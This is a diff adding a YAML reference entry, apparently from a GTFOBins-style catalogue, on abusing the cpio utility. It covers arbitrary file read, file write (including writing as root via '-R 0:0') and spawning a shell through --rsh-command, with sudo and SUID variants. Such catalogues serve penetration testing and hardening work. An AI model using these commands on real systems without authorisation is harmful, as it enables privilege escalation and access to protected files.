@@ -1,0 +1,50 @@
+---
+functions:
+  file-read:
+  - binary: false
+    code: |-
+      echo /path/to/input-file | cpio -o
+    comment: |-
+      The content of the file is printed to standard output, between the `cpio` archive format header and footer.
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  - code: |-
+      echo /path/to/input-file | cpio -dp .
+      cat path/to/input-file
+    comment: |-
+      The whole directory structure is copied to `.`, hence this is also a file write.
+    contexts:
+      sudo:
+        code: |-
+          echo /path/to/input-file | cpio -R $UID -dp .
+          cat path/to/input-file
+      suid:
+        code: |-
+          echo /path/to/input-file | cpio -R $UID -dp .
+          cat path/to/input-file
+      unprivileged:
+  file-write:
+  - code: |-
+      echo DATA >/path/to/temp-file
+      echo /path/to/temp-file | cpio -udp .
+    comment: |-
+      The whole directory structure is copied to `.`, with the data written to `./path/to/temp-file`.
+    contexts:
+      sudo:
+        code: |-
+          echo DATA >/path/to/temp-file
+          echo /path/to/temp-file | cpio -R 0:0 -udp .
+      suid:
+        code: |-
+          echo DATA >/path/to/temp-file
+          echo /path/to/temp-file | cpio -R 0:0 -udp .
+      unprivileged:
+  shell:
+  - code: |-
+      echo '/bin/sh </dev/tty >/dev/tty' >localhost
+      cpio -o --rsh-command /bin/sh -F localhost:
+    contexts:
+      sudo:
+...
